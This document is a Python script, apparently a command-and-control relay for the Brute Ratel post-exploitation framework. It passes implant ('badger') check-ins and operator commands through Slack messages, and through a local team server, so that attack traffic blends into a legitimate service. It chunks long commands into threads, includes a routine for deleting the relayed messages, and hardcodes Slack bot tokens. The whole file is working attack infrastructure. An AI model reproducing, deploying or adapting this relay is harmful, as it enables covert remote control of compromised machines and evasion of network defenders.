#!/usr/bin/python3

from concurrent.futures import thread
import readline
import threading
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import json
import base64
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Lock
from time import sleep
import base64

mutex = Lock()

threadMessageStart = "start$"
threadMessageEnd = "$end"

LHOST = "0.0.0.0"
LPORT = 443
BADGER_APP_TOKEN = "Bearer xoxb-12345678-123456789-qAIcN8hBt0WgwRaJImILqM9j"
BADGER_APP_CHANNEL_ID = "D03AT6A4X9T" # click on the Apps name in the chats section and get the last value from the URL
BADGER_APP_MEMBER_ID = "U039KRC46BS" # click on the Apps name in the chats section and get the last value from the URL

LISTENER_APP_TOKEN = "Bearer xoxb-2144924547920-3382587054001-2xPrUBj0D8yf0D5BNDPh3nwY"

info = """
Adaptive C2 v0.1 for Brute Ratel c4
Author : Paranoid Ninja
"""

usage = """
Usage : adaptiveC2.py <certfile> <keyfile>
Eg.   : adaptiveC2.py /etc/letsencrypt/live/evasionlabs.com/fullchain.pem /etc/letsencrypt/live/evasionlabs.com/privkey.pem
"""

threadList = []

def FetchFullMessage(channel, token, msg_ts):
    t_threadDict = {}
    fullBadgerMessage = ""
    try:
        requestUri = "https://slack.com/api/conversations.replies?channel=" + channel + "&ts=" + msg_ts             # fetch all replies -> https://api.slack.com/methods/conversations.replies/
        response = requests.get(requestUri, headers={'Authorization': token})
        jdata = json.loads(response.text)

        for jsonMsg in jdata['messages']:                                                                           # extract all timestamps from messages and align them as per their time received - { "messages": [ { 'ts': '' } ] }
            if (jsonMsg['text'] != threadMessageEnd):
                t_threadDict[jsonMsg['ts']] = jsonMsg['text']
        for key, value in sorted(t_threadDict.items()):                                                             # concatenate all the replies in chronological order
            bufMsg = value.split(threadMessageStart)
            if len(bufMsg) > 1:
                fullBadgerMessage = fullBadgerMessage + bufMsg[1]
        if fullBadgerMessage != "":
            print("[+] Sending %d bytes" % len(fullBadgerMessage))
            LinkC2(fullBadgerMessage, channel, msg_ts)                                                              # send the message to ratel server
    except Exception as ex:
        print("[-] Exception reading replies:", ex)

def DeleteMessageAndReplies(channel, token, msg_ts):
    try:
        requestUri = "https://slack.com/api/conversations.replies?channel=" + channel + "&ts=" + msg_ts
        response = requests.get(requestUri, headers={'Authorization': token})
        jdata = json.loads(response.text)
        replyCount = 0
        for reply in jdata['messages']:
            replyCount += 1
            requestUri = "https://slack.com/api/chat.delete?channel="+ channel +"&ts=" + reply['ts']
            requests.get(requestUri, headers={'Authorization': token})
            sleep(0.5)                                                                                               # slack has a limitation of sending on 2 requests per second
        print("[+] %d replies/msgs deleted" % replyCount)
        requestUri = "https://slack.com/api/chat.delete?channel="+ channel +"&ts=" + msg_ts
        requests.get(requestUri, headers={'Authorization': token})
    except Exception as ex:
        print("[-] Exception while deleting message", ex)

def LinkC2(badgerMsg, channel, msg_ts):
    print("[+] ListenerApp Callback\n[+] Channel Id: %s\n[+] Msg ts: %s" % (channel, msg_ts))
    # DeleteMessageAndReplies(channel, LISTENER_APP_TOKEN, msg_ts)

    # send badger response to ratel server and recv the next command
    try:
        response = requests.post('https://127.0.0.1:10443/detail/0HG57J5JNDOE9CJLXJ0QAZ6Z74/ref=atv_hm_hom_c_7d0kid_2_1', data=badgerMsg, verify=False)
        badgerCmd = response.text
        # print("[+] Command Received From Ratel Server:", badgerCmd)
        if len(badgerCmd) > 4000:
            print("[+] Command received from Ratel Server:", len(badgerCmd) ,"bytes")
            chunkSize = 3950
            chunks = [badgerCmd[i:i+chunkSize] for i in range(0, len(badgerCmd), chunkSize)]
            print("[+] Chunk count:", len(chunks))
            chunck_ts = ""
            # forward chunks to slack
            for part in chunks:
                t_msg = threadMessageStart + part
                if chunck_ts == "":
                    response = requests.post('https://slack.com/api/chat.postMessage', json={'channel':BADGER_APP_CHANNEL_ID, 'text': "<@" + BADGER_APP_MEMBER_ID + "> "+ t_msg}, headers={'Authorization': BADGER_APP_TOKEN})
                    if 'ts' in response.json() and 'channel' in response.json():
                        chunck_ts = response.json()["ts"]
                        print("[+] Primary chunk forwarded to BadgerApp:", len(part))
                    else:
                        print("[!] Error sending chunk:", response.json())
                else:
                    response = requests.post('https://slack.com/api/chat.postMessage', json={ 'thread_ts': chunck_ts ,'channel': BADGER_APP_CHANNEL_ID, 'text': "<@" + BADGER_APP_MEMBER_ID + "> "+ t_msg}, headers={'Authorization': BADGER_APP_TOKEN})
                    if 'ts' in response.json() and 'channel' in response.json():
                        print("[+] Chunk forwarded to BadgerApp:", len(part))
                    else:
                        print("[!] Error sending command:", response.json())
                sleep(1)                                                                                               # slack has a limitation of sending on 2 requests per second

            # Send the final delimiter to specify the thread has ended
            response = requests.post('https://slack.com/api/chat.postMessage', json={ 'thread_ts': chunck_ts ,'channel': BADGER_APP_CHANNEL_ID, 'text': "<@" + BADGER_APP_MEMBER_ID + "> "+ threadMessageEnd}, headers={'Authorization': BADGER_APP_TOKEN})
            if 'ts' in response.json() and 'channel' in response.json():
                print("[+] Thread ended")
            else:
                print("[!] Error sending chunk:", response.json())
        else:
            # forward command to slack
            response = requests.post('https://slack.com/api/chat.postMessage', json={'channel':BADGER_APP_CHANNEL_ID, 'text': "<@" + BADGER_APP_MEMBER_ID + "> "+ badgerCmd}, headers={'Authorization': BADGER_APP_TOKEN})
            if 'ts' in response.json() and 'channel' in response.json():
                print("[+] Callback forwarded to Brute Ratel Server")
            else:
                print("[!] Error sending command:", response.json())
    except Exception as ex:
        print("[!] Exception:", ex)

class AdaptiveC2Handler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        content = f"{message}"
        return content.encode("utf8")

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("404 Not Found"))
        currtime = (datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
        print("[" + currtime + "] GET request from " + self.address_string())
        for x, y in self.headers.items():
            print("  - ", x, ": ", y )
        print("------------------------------------------------------------")

    def do_HEAD(self):
        self._set_headers()
        self.wfile.write(self._html("404 Not Found"))
        currtime = (datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
        print("[" + currtime + "] HEAD request from " + self.address_string())
        for x, y in self.headers.items():
            print("  - ", x, ": ", y )
        print("------------------------------------------------------------")

    def do_POST(self):
        try:
            postData = ((self.rfile.read(int(self.headers['content-length']))).decode('utf-8')).rstrip('\r\n\r\n\0')
            jdata = json.loads(postData)
            if "challenge" in jdata:
                print("[*] Slack challenge received")
                data = "challenge=" + jdata["challenge"]
                self._set_headers()
                self.wfile.write(self._html(data))
                return
            elif "text" in jdata["event"]:
                this_msg_ts = jdata["event"]["ts"]
                channel = jdata["event"]["channel"]
                badgerMsg = jdata["event"]["text"]
                if "<@" in badgerMsg:
                    badgerMsg = " ".join(badgerMsg.split(" ")[1:])
                if threadMessageStart in badgerMsg and "thread_ts" not in jdata["event"]:                                   # new thread message received, store the timestamp in a list for verifying it later
                    print("[+] New thread started:", this_msg_ts)
                    threadList.append(this_msg_ts)
                elif "thread_ts" in jdata["event"] and threadMessageEnd in badgerMsg:
                    main_thread_ts = jdata["event"]["thread_ts"]
                    if (main_thread_ts in threadList):
                        threadList.remove(main_thread_ts)
                        print("[+] Thread closed:", main_thread_ts)
                        self._set_headers()
                        self.wfile.write(self._html(""))
                        print("------------------------------------------------------------")
                        newThread=threading.Thread(target=FetchFullMessage, args=(channel, LISTENER_APP_TOKEN, main_thread_ts))
                        newThread.start()
                        return
                    else:
                        print("[+] Unknown msg:", this_msg_ts)
                elif "thread_ts" in jdata["event"]:
                    main_thread_ts = jdata["event"]["thread_ts"]
                    print("[+] Thread reply received:", main_thread_ts +":" + this_msg_ts)
                else:
                    print("[+] Full msg:", len(badgerMsg), "bytes")
                    self._set_headers()
                    self.wfile.write(self._html(""))
                    print("------------------------------------------------------------")
                    newThread=threading.Thread(target=LinkC2, args=(badgerMsg, channel, this_msg_ts))
                    newThread.start()
                    return

                self._set_headers()
                self.wfile.write(self._html(""))
                print("------------------------------------------------------------")
            # else:
            #     print(jdata, "\n")
        except Exception as ex:
            print("[-] Exception:", ex)

    def log_message(self, format, *args):
        return

def main():
    print(info)
    if (len(sys.argv) < 3):
        print(usage)
        return
    currtime = (datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
    print(f"[+] {currtime} Starting Adaptive C2 Server on {LHOST}:{LPORT}")
    server = HTTPServer((LHOST, LPORT), AdaptiveC2Handler)
    server.socket = ssl.wrap_socket(server.socket, certfile=sys.argv[1], keyfile=sys.argv[2], server_side=True)
    thread = threading.Thread(None, server.serve_forever)
    thread.daemon = True
    thread.start()
    thread.join()

if __name__ == "__main__":
    main()

